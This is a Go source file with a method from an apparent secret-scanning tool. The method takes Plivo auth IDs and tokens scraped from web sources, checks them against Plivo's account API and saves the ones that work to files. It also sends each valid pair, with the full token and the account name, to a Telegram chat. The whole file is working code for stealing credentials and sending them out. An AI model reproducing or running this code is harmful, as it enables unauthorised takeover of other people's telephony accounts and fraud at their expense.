package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

func (a *AWSScanner) CheckPlivo(authID, authToken, sourceURL string) bool {
	if !a.Config.APIValidation.Plivo {
		return false
	}
	combined := authID + ":" + authToken
	if _, loaded := a.KnownKeys.LoadOrStore(combined, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, combined), "plivo_found.txt")

	url := "https://api.plivo.com/v1/Account/" + authID + "/"
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return false
	}
	req.SetBasicAuth(authID, authToken)
	req.Header.Set("Accept", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	resp, err := do429Retry(client, req, 3)
	if err != nil || resp == nil {
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return false
	}

	var res struct {
		Name         string `json:"name"`
		AutoRecharge bool   `json:"auto_recharge"`
	}
	json.NewDecoder(resp.Body).Decode(&res)
	info := res.Name

	a.logValid("Plivo", fmt.Sprintf("AuthID: %s | AuthToken: %s | Name: %s", authID, authToken, info))
	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, combined), "valid_plivo.txt")
	a.storeValidKeyLimit("Plivo", combined, info)

	globalCounters.mu.Lock()
	globalCounters.APIsValidated++
	globalCounters.mu.Unlock()

	msg := a.tgHit("📞", "PLIVO", sourceURL) + fmt.Sprintf(
		"Auth ID : %s\nAuth Token : %s\nAccount : %s\n", authID, authToken, info)
	go a.sendTelegram(msg)
	return true
}
